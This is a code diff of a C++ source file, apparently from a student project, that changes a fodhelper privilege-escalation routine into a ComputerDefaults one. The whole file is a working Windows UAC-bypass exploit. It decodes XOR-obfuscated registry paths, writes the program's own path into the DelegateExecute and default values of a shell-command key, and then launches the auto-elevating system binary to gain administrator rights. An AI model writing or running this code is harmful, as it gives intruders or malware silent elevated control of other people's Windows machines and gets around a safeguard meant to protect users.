@@ -1,38 +1,39 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   fodhelper.cpp                                      :+:      :+:    :+:   */
+/*   cddefaults.cpp                                     :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: zcadinot <zcadinot@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2026/08/24 02:17:12 by zcadinot          #+#    #+#             */
-/*   Updated: 2026/08/24 02:17:16 by zcadinot         ###   ########.fr       */
+/*   Created: 2026/08/24 05:40:00 by zcadinot          #+#    #+#             */
+/*   Updated: 2026/08/24 05:40:00 by zcadinot          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "privesc.hpp"
-#include <windows.h>
 
-bool elevate_fodhelper()
+
+bool elevate_computerdefaults()
 {
-    std::string regg_path;
+	char *path = get_myh_path();
+
+	std::string regg_path;
 
     regg_path = key_xor(
         std::string(path_reg, sizeof(FHELPER) - 1),
         XOR_KEY
     );
 
-    char *path = get_myh_path();
-    create_key(regg_path.c_str());
-    set_value(regg_path.c_str(), "DelegateExecute", path);
-    set_value(regg_path.c_str(), NULL, path);
-    std::string reg_path;
+	create_key(regg_path.c_str());
+	set_value(regg_path.c_str(), "DelegateExecute", path);
+	set_value(regg_path.c_str(), NULL, path);
+	std::string reg_path;
 
     reg_path = key_xor(
-        std::string(FHELPER, sizeof(FHELPER) - 1),
+        std::string(CDDEFAULTS, sizeof(CDDEFAULTS) - 1),
         XOR_KEY
     );
     system(reg_path.c_str());
-    ExitProcess(0);
-    return (true);
+	ExitProcess(0);
+	return (true);
 }
